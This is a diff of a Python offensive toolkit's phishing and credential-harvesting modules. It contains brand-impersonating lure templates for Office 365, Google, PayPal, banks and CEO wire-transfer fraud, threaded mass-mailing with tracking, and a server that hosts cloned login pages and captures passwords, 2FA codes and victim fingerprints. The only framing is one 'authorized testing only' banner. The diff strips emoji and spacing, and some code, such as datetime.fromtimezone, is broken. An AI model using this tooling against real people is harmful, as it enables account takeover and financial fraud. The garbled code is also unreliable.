+        print(f"\n{Fore.GREEN}[] Campaign completed{Style.RESET_ALL}")
     
     def _resolve_phishing_profile(self):
         """Build comprehensive phishing campaign configuration"""
@@ -15787,7 +15787,7 @@ ignore_broadcast_ssid=0"""
             
             # Campaign settings
             campaign_name = self.module_options.get('campaign_name', f'phishing_{int(time.time())}')
-            subject = self.module_options.get('subject', '')  # Auto from template if empty
+            subject = self.module_options.get('subject', '') # Auto from template if empty
             phish_url = self.module_options.get('phish_url', 'http://localhost:8080')
             
             # Advanced options
@@ -15800,7 +15800,7 @@ ignore_broadcast_ssid=0"""
             
             # Performance settings
             threads = int(self.module_options.get('threads', '5'))
-            rate_limit = int(self.module_options.get('rate_limit', '10'))  # emails per minute
+            rate_limit = int(self.module_options.get('rate_limit', '10')) # emails per minute
             delay_min = float(self.module_options.get('delay_min', '1'))
             delay_max = float(self.module_options.get('delay_max', '5'))
             
@@ -15813,7 +15813,7 @@ ignore_broadcast_ssid=0"""
             
             # Export settings
             export_results = self.module_options.get('export_results', 'true').lower() == 'true'
-            export_format = self.module_options.get('export_format', 'all')  # csv, json, html, all
+            export_format = self.module_options.get('export_format', 'all') # csv, json, html, all
             
             # Auto execute (for testing)
             auto_execute = self.module_options.get('auto_execute', 'false').lower() == 'true'
@@ -15852,7 +15852,7 @@ ignore_broadcast_ssid=0"""
             return profile
             
         except Exception as e:
-            print(f"{Fore.RED}[✗] Profile error: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Profile error: {str(e)}{Style.RESET_ALL}")
             return None
     
     def _get_phishing_templates(self):
@@ -15860,161 +15860,161 @@ ignore_broadcast_ssid=0"""
         return {
             'office365': {
                 'name': 'Microsoft Office 365',
-                'subject': '🔔 Password Expiration Notice',
+                'subject': ' Password Expiration Notice',
                 'preheader': 'Your password will expire in 24 hours',
-                'logo': '🔷',
+                'logo': '',
                 'color': '#0078D4',
                 'category': 'credential_theft'
             },
             'google': {
                 'name': 'Google Security Alert',
-                'subject': '⚠️ Unusual Sign-In Activity Detected',
+                'subject': '️ Unusual Sign-In Activity Detected',
                 'preheader': 'We detected a new sign-in to your Google Account',
-                'logo': '🔴',
+                'logo': '',
                 'color': '#EA4335',
                 'category': 'credential_theft'
             },
             'paypal': {
                 'name': 'PayPal Security',
-                'subject': '⚠️ Unusual Activity on Your Account',
+                'subject': '️ Unusual Activity on Your Account',
                 'preheader': 'We noticed some unusual activity',
-                'logo': '🔵',
+                'logo': '',
                 'color': '#003087',
                 'category': 'credential_theft'
             },
             'amazon': {
                 'name': 'Amazon Account Alert',
-                'subject': '📦 Order Confirmation Required',
+                'subject': ' Order Confirmation Required',
                 'preheader': 'Confirm your recent order #',
-                'logo': '🟠',
+                'logo': '',
                 'color': '#FF9900',
                 'category': 'credential_theft'
             },
             'linkedin': {
                 'name': 'LinkedIn Notification',
-                'subject': '👥 You appeared in 12 searches this week',
+                'subject': ' You appeared in 12 searches this week',
                 'preheader': 'See who viewed your profile',
-                'logo': '🔷',
+                'logo': '',
                 'color': '#0077B5',
                 'category': 'credential_theft'
             },
             'facebook': {
                 'name': 'Facebook Security',
-                'subject': '🔒 New Login from Unknown Device',
+                'subject': ' New Login from Unknown Device',
                 'preheader': 'Was this you?',
-                'logo': '🔵',
+                'logo': '',
                 'color': '#1877F2',
                 'category': 'credential_theft'
             },
             'apple': {
                 'name': 'Apple ID',
-                'subject': '🍎 Your Apple ID Was Used to Sign In',
+                'subject': ' Your Apple ID Was Used to Sign In',
                 'preheader': 'on a device near',
-                'logo': '⚫',
+                'logo': '',
                 'color': '#000000',
                 'category': 'credential_theft'
             },
             'bank_generic': {
                 'name': 'Banking Alert',
-                'subject': '🏦 Security Alert: Unusual Transaction',
+                'subject': ' Security Alert: Unusual Transaction',
                 'preheader': 'Please verify your recent activity',
-                'logo': '🏛️',
+                'logo': '️',
                 'color': '#003366',
                 'category': 'credential_theft'
             },
             'dropbox': {
                 'name': 'Dropbox',
-                'subject': '📁 Shared Folder Access Request',
+                'subject': ' Shared Folder Access Request',
                 'preheader': 'Someone shared a file with you',
-                'logo': '🔵',
+                'logo': '',
                 'color': '#0061FF',
                 'category': 'malware'
             },
             'docusign': {
                 'name': 'DocuSign',
-                'subject': '✍️ Please Review and Sign Document',
+                'subject': '️ Please Review and Sign Document',
                 'preheader': 'Action required on your document',
-                'logo': '🟡',
+                'logo': '',
                 'color': '#FFB400',
                 'category': 'malware'
             },
             'ups_shipping': {
                 'name': 'UPS Tracking',
-                'subject': '📦 UPS Package Delivery Attempt Failed',
+                'subject': ' UPS Package Delivery Attempt Failed',
                 'preheader': 'Track your package',
-                'logo': '🟤',
+                'logo': '',
                 'color': '#351C15',
                 'category': 'malware'
             },
             'fedex_shipping': {
                 'name': 'FedEx',
-                'subject': '📮 FedEx Shipment Notification',
+                'subject': ' FedEx Shipment Notification',
                 'preheader': 'Your package is on the way',
-                'logo': '🟣',
+                'logo': '',
                 'color': '#4D148C',
                 'category': 'malware'
             },
             'zoom': {
                 'name': 'Zoom',
-                'subject': '📹 You Missed a Zoom Meeting',
+                'subject': ' You Missed a Zoom Meeting',
                 'preheader': 'Recording available',
-                'logo': '🔵',
+                'logo': '',
                 'color': '#2D8CFF',
                 'category': 'credential_theft'
             },
             'slack': {
                 'name': 'Slack',
-                'subject': '💬 You Have New Direct Messages',
+                'subject': ' You Have New Direct Messages',
                 'preheader': 'Check your unread messages',
-                'logo': '🟣',
+                'logo': '',
                 'color': '#611F69',
                 'category': 'credential_theft'
             },
             'teams': {
                 'name': 'Microsoft Teams',
-                'subject': '💼 New Team Activity',
+                'subject': ' New Team Activity',
                 'preheader': 'You were mentioned in a conversation',
-                'logo': '🔷',
+                'logo': '',
                 'color': '#6264A7',
                 'category': 'credential_theft'
             },
             'hr_policy': {
                 'name': 'HR Department',
-                'subject': '📋 Mandatory: New Company Policy Acknowledgement',
+                'subject': ' Mandatory: New Company Policy Acknowledgement',
                 'preheader': 'Action required by end of week',
-                'logo': '📄',
+                'logo': '',
                 'color': '#333333',
                 'category': 'internal'
             },
             'it_support': {
                 'name': 'IT Support',
-                'subject': '🔧 System Maintenance Scheduled',
+                'subject': ' System Maintenance Scheduled',
                 'preheader': 'Please backup your data',
-                'logo': '💻',
+                'logo': '',
                 'color': '#0066CC',
                 'category': 'internal'
             },
             'invoice': {
                 'name': 'Accounting',
-                'subject': '💳 Invoice #{{invoice_number}} - Payment Due',
+                'subject': ' Invoice #{{invoice_number}} - Payment Due',
                 'preheader': 'Please remit payment',
-                'logo': '💰',
+                'logo': '',
                 'color': '#006633',
                 'category': 'bec'
             },
             'wire_transfer': {
                 'name': 'Finance Department',
-                'subject': '💸 URGENT: Wire Transfer Request',
+                'subject': ' URGENT: Wire Transfer Request',
                 'preheader': 'CEO approval required',
-                'logo': '🏦',
+                'logo': '',
                 'color': '#CC0000',
                 'category': 'bec'
             },
             'covid_test': {
                 'name': 'Health Department',
-                'subject': '🏥 COVID-19 Test Results Available',
+                'subject': ' COVID-19 Test Results Available',
                 'preheader': 'View your test results',
-                'logo': '⚕️',
+                'logo': '️',
                 'color': '#009688',
                 'category': 'social'
             }
@@ -16026,23 +16026,23 @@ ignore_broadcast_ssid=0"""
         template_info = templates.get(profile['template'], {})
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║      ADVANCED PHISHING CAMPAIGN MANAGER v3.0           ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ ADVANCED PHISHING CAMPAIGN MANAGER v3.0 ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
-        print(f"{Fore.YELLOW}[📧] Campaign Configuration:{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[] Campaign Configuration:{Style.RESET_ALL}")
         print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}Campaign:{Style.RESET_ALL} {profile['campaign_name']}")
-        print(f"  {Fore.CYAN}Template:{Style.RESET_ALL} {template_info.get('logo', '•')} {template_info.get('name', profile['template'])}")
-        print(f"  {Fore.CYAN}Targets File:{Style.RESET_ALL} {profile['targets_file']}")
-        print(f"  {Fore.CYAN}Phishing URL:{Style.RESET_ALL} {profile['phish_url']}")
+        print(f" {Fore.CYAN}Campaign:{Style.RESET_ALL} {profile['campaign_name']}")
+        print(f" {Fore.CYAN}Template:{Style.RESET_ALL} {template_info.get('logo', '•')} {template_info.get('name', profile['template'])}")
+        print(f" {Fore.CYAN}Targets File:{Style.RESET_ALL} {profile['targets_file']}")
+        print(f" {Fore.CYAN}Phishing URL:{Style.RESET_ALL} {profile['phish_url']}")
         
-        print(f"\n{Fore.YELLOW}[📤] SMTP Configuration:{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}[] SMTP Configuration:{Style.RESET_ALL}")
         print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}Server:{Style.RESET_ALL} {profile['smtp_server']}:{profile['smtp_port']}")
-        print(f"  {Fore.CYAN}From:{Style.RESET_ALL} {profile['from_name']} <{profile['from_email']}>")
-        print(f"  {Fore.CYAN}Auth:{Style.RESET_ALL} {'✓' if profile['smtp_user'] else '✗'} {'TLS' if profile['use_tls'] else 'SSL' if profile['use_ssl'] else 'None'}")
+        print(f" {Fore.CYAN}Server:{Style.RESET_ALL} {profile['smtp_server']}:{profile['smtp_port']}")
+        print(f" {Fore.CYAN}From:{Style.RESET_ALL} {profile['from_name']} <{profile['from_email']}>")
+        print(f" {Fore.CYAN}Auth:{Style.RESET_ALL} {'' if profile['smtp_user'] else ''} {'TLS' if profile['use_tls'] else 'SSL' if profile['use_ssl'] else 'None'}")
         
-        print(f"\n{Fore.YELLOW}[⚙️] Features:{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}[️] Features:{Style.RESET_ALL}")
         print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
         features = []
         if profile['track_opens']:
@@ -16057,15 +16057,15 @@ ignore_broadcast_ssid=0"""
             features.append(f"Attachment: {profile['attachment_name'] or os.path.basename(profile['attachment'])}")
         
         for feature in features:
-            print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {feature}")
+            print(f" {Fore.GREEN}{Style.RESET_ALL} {feature}")
         
-        print(f"\n{Fore.YELLOW}[⚡] Performance:{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}[] Performance:{Style.RESET_ALL}")
         print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}Threads:{Style.RESET_ALL} {profile['threads']}")
-        print(f"  {Fore.CYAN}Rate Limit:{Style.RESET_ALL} {profile['rate_limit']} emails/minute")
-        print(f"  {Fore.CYAN}Delay:{Style.RESET_ALL} {profile['delay_min']}-{profile['delay_max']}s per email")
+        print(f" {Fore.CYAN}Threads:{Style.RESET_ALL} {profile['threads']}")
+        print(f" {Fore.CYAN}Rate Limit:{Style.RESET_ALL} {profile['rate_limit']} emails/minute")
+        print(f" {Fore.CYAN}Delay:{Style.RESET_ALL} {profile['delay_min']}-{profile['delay_max']}s per email")
         
-        print(f"\n{Fore.YELLOW}[⚠️] WARNING:{Style.RESET_ALL} {Fore.RED}Authorized testing only!{Style.RESET_ALL}\n")
+        print(f"\n{Fore.YELLOW}[️] WARNING:{Style.RESET_ALL} {Fore.RED}Authorized testing only!{Style.RESET_ALL}\n")
     
     def _initialize_phishing_campaign(self, profile):
         """Initialize campaign data structures and database"""
@@ -16158,11 +16158,11 @@ ignore_broadcast_ssid=0"""
                 }
             }
             
-            print(f"{Fore.GREEN}[✓] Campaign initialized: {campaign['name']} (ID: {campaign['id']}){Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[] Campaign initialized: {campaign['name']} (ID: {campaign['id']}){Style.RESET_ALL}")
             return campaign
             
         except Exception as e:
-            print(f"{Fore.RED}[✗] Campaign init error: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Campaign init error: {str(e)}{Style.RESET_ALL}")
             return None
     
     def _load_phishing_targets(self, profile, campaign):
@@ -16170,7 +16170,7 @@ ignore_broadcast_ssid=0"""
         targets = []
         
         if not os.path.exists(profile['targets_file']):
-            print(f"{Fore.RED}[✗] Targets file not found: {profile['targets_file']}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Targets file not found: {profile['targets_file']}{Style.RESET_ALL}")
             return []
         
         try:
@@ -16242,7 +16242,7 @@ ignore_broadcast_ssid=0"""
             return targets
             
         except Exception as e:
-            print(f"{Fore.RED}[✗] Target loading error: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Target loading error: {str(e)}{Style.RESET_ALL}")
             import traceback
             traceback.print_exc()
             return []
@@ -16305,10 +16305,10 @@ ignore_broadcast_ssid=0"""
                     with results_lock:
                         if success:
                             results['sent'] += 1
-                            print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Sent to {target['email']}")
+                            print(f"{Fore.GREEN}[]{Style.RESET_ALL} Sent to {target['email']}")
                         else:
                             results['failed'] += 1
-                            print(f"{Fore.RED}[✗]{Style.RESET_ALL} Failed: {target['email']}")
+                            print(f"{Fore.RED}[]{Style.RESET_ALL} Failed: {target['email']}")
                     
                     # Update database
                     conn = sqlite3.connect(profile['db_file'])
@@ -16323,7 +16323,7 @@ ignore_broadcast_ssid=0"""
                     with results_lock:
                         results['failed'] += 1
                         results['errors'].append(f"{target['email']}: {str(e)}")
-                    print(f"{Fore.RED}[✗]{Style.RESET_ALL} Error: {target['email']} - {str(e)}")
+                    print(f"{Fore.RED}[]{Style.RESET_ALL} Error: {target['email']} - {str(e)}")
                 
                 finally:
                     rate_limiter.release()
@@ -16396,7 +16396,7 @@ ignore_broadcast_ssid=0"""
         """Generate professional HTML email template"""
         template_name = profile['template']
         color = template_info.get('color', '#0066CC')
-        logo = template_info.get('logo', '📧')
+        logo = template_info.get('logo', '')
         name = template_info.get('name', 'Security Alert')
         
         # Track links
@@ -16479,7 +16479,7 @@ ignore_broadcast_ssid=0"""
             <p>Hello {variables['full_name']},</p>
             <p>Your Microsoft Office 365 password will expire in <strong>24 hours</strong>.</p>
             <div class="warning-box">
-                <strong>⚠️ Action Required:</strong> To avoid interruption to your email and Office services, please update your password immediately.
+                <strong>️ Action Required:</strong> To avoid interruption to your email and Office services, please update your password immediately.
             </div>
             <p>Click the button below to verify your account and update your password:</p>
             <center>
@@ -16494,9 +16494,9 @@ ignore_broadcast_ssid=0"""
             <p>Hi {variables['full_name']},</p>
             <p>We detected an unusual sign-in attempt to your Google Account from:</p>
             <div class="warning-box">
-                <strong>📍 Location:</strong> Unknown (IP: 203.0.113.42)<br>
-                <strong>🖥️ Device:</strong> Windows PC<br>
-                <strong>🕐 Time:</strong> Just now
+                <strong> Location:</strong> Unknown (IP: 203.0.113.42)<br>
+                <strong>️ Device:</strong> Windows PC<br>
+                <strong> Time:</strong> Just now
             </div>
             <p><strong>Was this you?</strong></p>
             <p>If you recognize this activity, you can disregard this message.</p>
@@ -16511,7 +16511,7 @@ ignore_broadcast_ssid=0"""
             <p>Hello {variables['full_name']},</p>
             <p>We noticed some <strong>unusual activity</strong> in your PayPal account.</p>
             <div class="warning-box">
-                <strong>⚠️ Security Alert:</strong> Multiple failed login attempts detected.
+                <strong>️ Security Alert:</strong> Multiple failed login attempts detected.
             </div>
             <p>To protect your account, we've temporarily limited some features. Please verify your account information to restore full access.</p>
             <center>
@@ -16628,26 +16628,26 @@ ignore_broadcast_ssid=0"""
         runtime = time.time() - campaign['start_time']
         
         print(f"\n{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}[📊] CAMPAIGN RESULTS{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[] CAMPAIGN RESULTS{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}\n")
         
-        print(f"{Fore.YELLOW}[📈] Statistics:{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[] Statistics:{Style.RESET_ALL}")
         print(f"{Fore.WHITE}{'─' * 70}{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}Campaign:{Style.RESET_ALL} {campaign['name']}")
-        print(f"  {Fore.CYAN}Runtime:{Style.RESET_ALL} {int(runtime // 60)}m {int(runtime % 60)}s")
-        print(f"  {Fore.CYAN}Emails Sent:{Style.RESET_ALL} {Fore.GREEN}{results['sent']}{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}Failed:{Style.RESET_ALL} {Fore.RED}{results['failed']}{Style.RESET_ALL}")
+        print(f" {Fore.CYAN}Campaign:{Style.RESET_ALL} {campaign['name']}")
+        print(f" {Fore.CYAN}Runtime:{Style.RESET_ALL} {int(runtime // 60)}m {int(runtime % 60)}s")
+        print(f" {Fore.CYAN}Emails Sent:{Style.RESET_ALL} {Fore.GREEN}{results['sent']}{Style.RESET_ALL}")
+        print(f" {Fore.CYAN}Failed:{Style.RESET_ALL} {Fore.RED}{results['failed']}{Style.RESET_ALL}")
         
         if results['sent'] > 0:
             success_rate = (results['sent'] / (results['sent'] + results['failed'])) * 100
-            print(f"  {Fore.CYAN}Success Rate:{Style.RESET_ALL} {success_rate:.1f}%")
+            print(f" {Fore.CYAN}Success Rate:{Style.RESET_ALL} {success_rate:.1f}%")
         
         if results['errors']:
-            print(f"\n{Fore.YELLOW}[⚠️] Errors:{Style.RESET_ALL}")
-            for error in results['errors'][:5]:  # Show first 5
-                print(f"  {Fore.RED}•{Style.RESET_ALL} {error}")
+            print(f"\n{Fore.YELLOW}[️] Errors:{Style.RESET_ALL}")
+            for error in results['errors'][:5]: # Show first 5
+                print(f" {Fore.RED}•{Style.RESET_ALL} {error}")
             if len(results['errors']) > 5:
-                print(f"  {Fore.YELLOW}... and {len(results['errors']) - 5} more{Style.RESET_ALL}")
+                print(f" {Fore.YELLOW}... and {len(results['errors']) - 5} more{Style.RESET_ALL}")
         
         print(f"\n{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}")
     
@@ -16733,7 +16733,7 @@ ignore_broadcast_ssid=0"""
             return exported_files
             
         except Exception as e:
-            print(f"{Fore.RED}[✗] Export error: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Export error: {str(e)}{Style.RESET_ALL}")
             return []
     
     def _generate_html_report(self, filepath, profile, campaign, results, targets_data):
@@ -16807,7 +16807,7 @@ ignore_broadcast_ssid=0"""
 </head>
 <body>
     <div class="container">
-        <h1>📧 Phishing Campaign Report</h1>
+        <h1> Phishing Campaign Report</h1>
         <p><strong>Campaign:</strong> {campaign['name']}</p>
         <p><strong>Template:</strong> {profile['template']}</p>
         <p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
@@ -16885,7 +16885,7 @@ ignore_broadcast_ssid=0"""
         profile = self._resolve_harvester_profile()
         
         if not profile:
-            print(f"{Fore.RED}[✗] Invalid configuration{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Invalid configuration{Style.RESET_ALL}")
             return
         
         # Display configuration
@@ -16895,7 +16895,7 @@ ignore_broadcast_ssid=0"""
         harvester = self._initialize_credential_harvester(profile)
         
         if not harvester:
-            print(f"{Fore.RED}[✗] Failed to initialize harvester{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Failed to initialize harvester{Style.RESET_ALL}")
             return
         
         # Start server
@@ -16939,7 +16939,7 @@ ignore_broadcast_ssid=0"""
             return profile
             
         except Exception as e:
-            print(f"{Fore.RED}[✗] Configuration error: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Configuration error: {str(e)}{Style.RESET_ALL}")
             return None
     
     def _get_available_templates(self):
@@ -16949,91 +16949,91 @@ ignore_broadcast_ssid=0"""
                 'name': 'Microsoft 365',
                 'fields': ['email', 'password'],
                 'redirect': 'https://login.microsoftonline.com',
-                'logo': '🔷'
+                'logo': ''
             },
             'google': {
                 'name': 'Google',
                 'fields': ['email', 'password'],
                 'redirect': 'https://accounts.google.com',
-                'logo': '🔴'
+                'logo': ''
             },
             'facebook': {
                 'name': 'Facebook',
                 'fields': ['email', 'password'],
                 'redirect': 'https://www.facebook.com',
-                'logo': '🔵'
+                'logo': ''
             },
             'linkedin': {
                 'name': 'LinkedIn',
                 'fields': ['username', 'password'],
                 'redirect': 'https://www.linkedin.com',
-                'logo': '🔷'
+                'logo': ''
             },
             'twitter': {
                 'name': 'Twitter/X',
                 'fields': ['username', 'password'],
                 'redirect': 'https://twitter.com',
-                'logo': '⚫'
+                'logo': ''
             },
             'instagram': {
                 'name': 'Instagram',
                 'fields': ['username', 'password'],
                 'redirect': 'https://www.instagram.com',
-                'logo': '🟣'
+                'logo': ''
             },
             'github': {
                 'name': 'GitHub',
                 'fields': ['username', 'password', '2fa'],
                 'redirect': 'https://github.com',
-                'logo': '⚫'
+                'logo': ''
             },
             'paypal': {
                 'name': 'PayPal',
                 'fields': ['email', 'password'],
                 'redirect': 'https://www.paypal.com',
-                'logo': '🔵'
+                'logo': ''
             },
             'amazon': {
                 'name': 'Amazon',
                 'fields': ['email', 'password'],
                 'redirect': 'https://www.amazon.com',
-                'logo': '🟠'
+                'logo': ''
             },
             'apple': {
                 'name': 'Apple ID',
                 'fields': ['email', 'password', '2fa'],
                 'redirect': 'https://appleid.apple.com',
-                'logo': '⚫'
+                'logo': ''
             },
             'dropbox': {
                 'name': 'Dropbox',
                 'fields': ['email', 'password'],
                 'redirect': 'https://www.dropbox.com',
-                'logo': '🔵'
+                'logo': ''
             },
             'slack': {
                 'name': 'Slack',
                 'fields': ['email', 'password'],
                 'redirect': 'https://slack.com',
-                'logo': '🟣'
+                'logo': ''
             },
             'zoom': {
                 'name': 'Zoom',
                 'fields': ['email', 'password'],
                 'redirect': 'https://zoom.us',
-                'logo': '🔵'
+                'logo': ''
             },
             'netflix': {
                 'name': 'Netflix',
                 'fields': ['email', 'password'],
                 'redirect': 'https://www.netflix.com',
-                'logo': '🔴'
+                'logo': ''
             },
             'office365': {
                 'name': 'Office 365',
                 'fields': ['email', 'password', '2fa'],
                 'redirect': 'https://office.com',
-                'logo': '🔷'
+                'logo': ''
             }
         }
     
@@ -17048,44 +17048,44 @@ ignore_broadcast_ssid=0"""
         template_info = templates.get(profile['template'], {})
         
         print(f"{Fore.CYAN}╔════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║        ADVANCED CREDENTIAL HARVESTER v2.0             ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ ADVANCED CREDENTIAL HARVESTER v2.0 ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
-        print(f"{Fore.YELLOW}[📋] Configuration:{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[] Configuration:{Style.RESET_ALL}")
         print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}Template:{Style.RESET_ALL} {template_info.get('logo', '•')} {template_info.get('name', profile['template'])}")
-        print(f"  {Fore.CYAN}Listen:{Style.RESET_ALL} {'https' if profile['use_ssl'] else 'http'}://{profile['lhost']}:{profile['port']}")
-        print(f"  {Fore.CYAN}Redirect:{Style.RESET_ALL} {profile['redirect_url']}")
-        print(f"  {Fore.CYAN}Database:{Style.RESET_ALL} {profile['db_file']}")
+        print(f" {Fore.CYAN}Template:{Style.RESET_ALL} {template_info.get('logo', '•')} {template_info.get('name', profile['template'])}")
+        print(f" {Fore.CYAN}Listen:{Style.RESET_ALL} {'https' if profile['use_ssl'] else 'http'}://{profile['lhost']}:{profile['port']}")
+        print(f" {Fore.CYAN}Redirect:{Style.RESET_ALL} {profile['redirect_url']}")
+        print(f" {Fore.CYAN}Database:{Style.RESET_ALL} {profile['db_file']}")
         
-        print(f"\n{Fore.YELLOW}[⚙️] Features Enabled:{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}[️] Features Enabled:{Style.RESET_ALL}")
         print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
         features = []
         if profile['use_ssl']:
-            features.append(f"{Fore.GREEN}✓ SSL/TLS Encryption{Style.RESET_ALL}")
+            features.append(f"{Fore.GREEN} SSL/TLS Encryption{Style.RESET_ALL}")
         if profile['capture_ip']:
-            features.append(f"{Fore.GREEN}✓ IP Geolocation{Style.RESET_ALL}")
+            features.append(f"{Fore.GREEN} IP Geolocation{Style.RESET_ALL}")
         if profile['capture_useragent']:
-            features.append(f"{Fore.GREEN}✓ User-Agent Fingerprinting{Style.RESET_ALL}")
+            features.append(f"{Fore.GREEN} User-Agent Fingerprinting{Style.RESET_ALL}")
         if profile['capture_2fa']:
-            features.append(f"{Fore.GREEN}✓ 2FA Code Capture{Style.RESET_ALL}")
+            features.append(f"{Fore.GREEN} 2FA Code Capture{Style.RESET_ALL}")
         if profile['session_tracking']:
-            features.append(f"{Fore.GREEN}✓ Session Tracking{Style.RESET_ALL}")
+            features.append(f"{Fore.GREEN} Session Tracking{Style.RESET_ALL}")
         if profile['fingerprint']:
-            features.append(f"{Fore.GREEN}✓ Browser Fingerprinting{Style.RESET_ALL}")
+            features.append(f"{Fore.GREEN} Browser Fingerprinting{Style.RESET_ALL}")
         if profile['email_notify']:
-            features.append(f"{Fore.GREEN}✓ Email Notifications{Style.RESET_ALL}")
+            features.append(f"{Fore.GREEN} Email Notifications{Style.RESET_ALL}")
         
         for feature in features:
-            print(f"  {feature}")
+            print(f" {feature}")
         
-        print(f"\n{Fore.YELLOW}[🎯] Capture Fields:{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}[] Capture Fields:{Style.RESET_ALL}")
         print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
         fields = template_info.get('fields', ['username', 'password'])
         for field in fields:
-            print(f"  {Fore.CYAN}•{Style.RESET_ALL} {field.capitalize()}")
+            print(f" {Fore.CYAN}•{Style.RESET_ALL} {field.capitalize()}")
         
-        print(f"\n{Fore.YELLOW}[⚠️] WARNING:{Style.RESET_ALL} {Fore.RED}Authorized penetration testing only!{Style.RESET_ALL}\n")
+        print(f"\n{Fore.YELLOW}[️] WARNING:{Style.RESET_ALL} {Fore.RED}Authorized penetration testing only!{Style.RESET_ALL}\n")
     
     def _initialize_credential_harvester(self, profile):
         """Initialize harvester data structures"""
@@ -17106,7 +17106,7 @@ ignore_broadcast_ssid=0"""
             
             # Initialize database
             if self._init_harvester_database(profile):
-                print(f"{Fore.GREEN}[✓] Database initialized: {profile['db_file']}{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}[] Database initialized: {profile['db_file']}{Style.RESET_ALL}")
             
             # Initialize logging
             logging.basicConfig(
@@ -17119,7 +17119,7 @@ ignore_broadcast_ssid=0"""
             return harvester
             
         except Exception as e:
-            print(f"{Fore.RED}[✗] Initialization error: {str(e)}{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Initialization error: {str(e)}{Style.RESET_ALL}")
             return None
     
     def _init_harvester_database(self, profile):
@@ -17197,7 +17197,7 @@ ignore_broadcast_ssid=0"""
             
             def log_message(self, format, *args):
                 """Custom logging"""
-                pass  # Suppress default logging
+                pass # Suppress default logging
             
             def do_GET(self):
                 """Handle GET requests - serve phishing page"""
@@ -17486,7 +17486,7 @@ ignore_broadcast_ssid=0"""
             </div>
             
             <div class="security-notice">
-                🔒 Your connection is secure and encrypted
+                 Your connection is secure and encrypted
             </div>
         </form>
     </div>
@@ -17612,21 +17612,21 @@ ignore_broadcast_ssid=0"""
             def _display_capture(self, capture):
                 """Display captured credentials"""
                 print(f"\n{Fore.GREEN}{'═' * 70}{Style.RESET_ALL}")
-                print(f"{Fore.GREEN}[✓] CREDENTIALS CAPTURED!{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}[] CREDENTIALS CAPTURED!{Style.RESET_ALL}")
                 print(f"{Fore.GREEN}{'═' * 70}{Style.RESET_ALL}")
                 
-                print(f"{Fore.CYAN}[📍] IP Address:{Style.RESET_ALL} {capture['ip_address']} ({capture['country']})")
-                print(f"{Fore.CYAN}[🌐] Browser:{Style.RESET_ALL} {capture['browser']} on {capture['os']}")
-                print(f"{Fore.CYAN}[🔑] Session:{Style.RESET_ALL} {capture['session_id'][:16]}...")
-                print(f"{Fore.CYAN}[🕐] Time:{Style.RESET_ALL} {datetime.fromtimezone(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}")
+                print(f"{Fore.CYAN}[] IP Address:{Style.RESET_ALL} {capture['ip_address']} ({capture['country']})")
+                print(f"{Fore.CYAN}[] Browser:{Style.RESET_ALL} {capture['browser']} on {capture['os']}")
+                print(f"{Fore.CYAN}[] Session:{Style.RESET_ALL} {capture['session_id'][:16]}...")
+                print(f"{Fore.CYAN}[] Time:{Style.RESET_ALL} {datetime.fromtimezone(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}")
                 
-                print(f"\n{Fore.YELLOW}[📋] Captured Data:{Style.RESET_ALL}")
+                print(f"\n{Fore.YELLOW}[] Captured Data:{Style.RESET_ALL}")
                 for key, value in capture['credentials'].items():
                     if key == 'password':
                         masked = '*' * len(value)
-                        print(f"  {Fore.WHITE}{key:12s}:{Style.RESET_ALL} {masked} {Fore.GREEN}(Length: {len(value)}){Style.RESET_ALL}")
+                        print(f" {Fore.WHITE}{key:12s}:{Style.RESET_ALL} {masked} {Fore.GREEN}(Length: {len(value)}){Style.RESET_ALL}")
                     else:
-                        print(f"  {Fore.WHITE}{key:12s}:{Style.RESET_ALL} {value}")
